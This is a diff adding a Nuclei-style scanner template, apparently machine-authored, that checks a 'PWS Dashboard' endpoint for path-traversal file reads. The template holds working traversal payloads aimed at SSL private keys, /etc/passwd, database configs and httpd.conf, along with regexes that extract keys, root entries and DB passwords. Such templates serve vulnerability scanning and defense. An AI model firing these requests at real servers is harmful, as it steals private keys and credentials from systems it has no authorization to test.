@@ -1,0 +1,81 @@
+http:
+    - extractors:
+        - group: 1
+          part: body
+          regex:
+            - (-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----)
+            - (root:.*?:0:0:[^\n]*)
+            - (DB_PASSWORD.*)
+          type: regex
+      matchers:
+        - status:
+            - 200
+          type: status
+        - condition: or
+          part: header
+          type: word
+          words:
+            - text/plain
+            - application/octet-stream
+        - part: body
+          regex:
+            - '-----BEGIN [A-Z ]*PRIVATE KEY-----'
+            - 'root:.*?:0:0:'
+            - ; for 16-bit app support
+            - DB_PASSWORD
+            - ServerRoot
+          type: regex
+        - negative: true
+          part: body
+          type: word
+          words:
+            - <!DOCTYPE html
+            - <html
+            - 404 Not Found
+            - Access Denied
+      matchers-condition: and
+      payloads:
+        file:
+            - ../../../apache/conf/ssl.key/server.key
+            - ../../../../etc/passwd
+            - ../../../../windows/win.ini
+            - ../../../config/database.php
+            - ../../../../Program Files/Apache Group/Apache/conf/httpd.conf
+      raw:
+        - |
+          GET /others/_test.php?test={{file}} HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+          Accept-Language: en-US,en;q=0.5
+          Accept-Encoding: gzip, deflate
+          Connection: close
+id: arbitrary-file-read-pws
+info:
+    author: ProjectDiscoveryAI
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: |
+        PWS Dashboard存在任意文件读取漏洞，攻击者可通过路径遍历读取系统敏感文件。
+        该漏洞可能导致敏感信息泄露，包括SSL私钥、配置文件等。
+    metadata:
+        max-request: 3
+        product: dashboard
+        vendor: pws
+        verified: true
+    name: PWS Dashboard Arbitrary File Read
+    reference:
+        - https://cwe.mitre.org/data/definitions/22.html
+        - https://owasp.org/www-community/attacks/Path_Traversal
+    severity: high
+    tags:
+        - pws
+        - dashboard
+        - path-traversal
+variables:
+    file_paths:
+        - ../../../apache/conf/ssl.key/server.key
+        - ../../../../etc/passwd
+        - ../../../../windows/win.ini
